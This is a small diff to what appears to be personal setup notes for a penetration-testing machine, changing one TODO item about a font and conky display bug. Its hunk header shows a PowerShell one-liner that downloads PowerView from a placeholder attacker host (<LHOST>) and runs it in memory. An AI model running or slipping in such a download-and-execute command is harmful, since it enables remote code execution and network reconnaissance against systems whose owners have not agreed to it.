@@ -64,7 +64,7 @@ IEX(New-Object Net.WebClient).DownloadString("http://<LHOST>/win/powerview.ps1")
 
 ## TODOs
 
-- [BAREMETAL] network manager applet
+- [BUG] nerdfont vs conky - locale?compare with VM
 
 ## Checkout
 Below are things I will get around to trying and will add them to the install script if I find them useful.
